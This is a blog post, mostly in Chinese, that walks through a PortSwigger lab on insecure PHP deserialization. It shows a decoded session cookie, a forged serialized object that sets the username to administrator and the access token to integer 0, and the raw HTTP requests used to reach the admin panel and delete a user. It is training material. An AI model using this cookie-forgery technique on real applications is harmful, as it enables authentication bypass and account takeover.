---
layout: post
title: "Modifying serialized data types"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Insecure_Deserialization
author: ""
tags: ['PortSwigger_Lab', 'Insecure_Deserialization']
---





# Modifying serialized data types


```
This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete Carlos.

You can log in to your own account using the following credentials: `wiener:peter`

#### Hint

To access another user's account, you will need to exploit a quirk in how PHP compares data of different types.



該實驗室使用基於序列化的會話機制，因此容易被繞過身份驗證。 解決實驗室，編輯會話cookie中的序列化對像以訪問管理員帳戶。 然後，刪除卡洛斯。

您可以使用以下憑據登錄到您自己的帳戶：wiener:peter
暗示

要訪問另一個用戶的帳戶，您需要利用 PHP 比較不同類型數據的方式的一個怪癖。





```



登入 -> update email -> 抓包


```http

POST /my-account/change-email HTTP/1.1
Host: 0aca0039043d31c1c04a054a00b40079.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJyNmN1Z2I0Mmo0cHpxanIxMmEybjk4cXI2YzBwemVjNyI7fQ%3d%3d
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0aca0039043d31c1c04a054a00b40079.web-security-academy.net
Referer: https://0aca0039043d31c1c04a054a00b40079.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333

```


cookie:
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJyNmN1Z2I0Mmo0cHpxanIxMmEybjk4cXI2YzBwemVjNyI7fQ

```


base64 decode:
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"r6cugb42j4pzqjr12a2n98qr6c0pzec7";}

```


官方教的


```
s:8:"username";s:6:"wiener";




///////////////////////////////////////

wiener 改成 administrator

長度 6 改成 13

///////////////////////////////////////



s:8:"username";s:13:"administrator";

```


接者
```
s:32:"r6cugb42j4pzqjr12a2n98qr6c0pzec7"

改成 整數 然後 長度=0

i:0;

```


最後payload:
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```


base64 encode:
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```



一樣用firefox 修改 cookie 會比較快。可以直接看到畫面
```
/admin 頁面

```

因為你提交它會一直302 跳轉，所以要一直手動修改 cookie，也可以看到畫面

然後直接去刪除 carlos 就成功




另一種老方法

而repeater 好像不會顯示出畫面，但看到 raw 可以看到有admin panel

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Connection: close
Content-Length: 3012

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Modifying serialized data types</title>
    </head>
    <body>
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
    <section class='academyLabBanner'>
        <div class=container>
            <div class=logo></div>
                <div class=title-container>
                    <h2>Modifying serialized data types</h2>
                    <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types'>
                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                            <g>
                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                            </g>
                        </svg>
                    </a>
                </div>
                <div class='widgetcontainer-lab-status is-notsolved'>
                    <span>LAB</span>
                    <p>Not solved</p>
                    <span class=lab-status-icon></span>
                </div>
            </div>
        </div>
    </section>
</div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=administrator">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: administrator</p>
                        <p>Your email is: 333@333</p>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
            </section>
        </div>
    </body>
</html>

```

關鍵
```
<a href="/admin">Admin panel</a><p>|</p>
```


修改repeater path 改成    /admin
```http

GET /admin HTTP/1.1
Host: 0ae300b404cc5ba5c08d55cd004200c3.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: https://0ae300b404cc5ba5c08d55cd004200c3.web-security-academy.net
Referer: https://0ae300b404cc5ba5c08d55cd004200c3.web-security-academy.net/my-account/change-email
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```

response:
```html

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Connection: close
Content-Length: 2876

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Modifying serialized data types</title>
    </head>
    <body>
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
    <section class='academyLabBanner'>
        <div class=container>
            <div class=logo></div>
                <div class=title-container>
                    <h2>Modifying serialized data types</h2>
                    <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types'>
                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                            <g>
                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                            </g>
                        </svg>
                    </a>
                </div>
                <div class='widgetcontainer-lab-status is-notsolved'>
                    <span>LAB</span>
                    <p>Not solved</p>
                    <span class=lab-status-icon></span>
                </div>
            </div>
        </div>
    </section>
</div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=administrator">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
        </div>
    </body>
</html>



```

關鍵:
```html
   <a href="/admin/delete?username=carlos">Delete</a>
```


修改
```http

GET /admin/delete?username=carlos HTTP/1.1
Host: 0a2b001c032e9e61c05722f5008800bd.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: https://0a2b001c032e9e61c05722f5008800bd.web-security-academy.net
Referer: https://0a2b001c032e9e61c05722f5008800bd.web-security-academy.net/my-account/change-email
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close



```


成功。


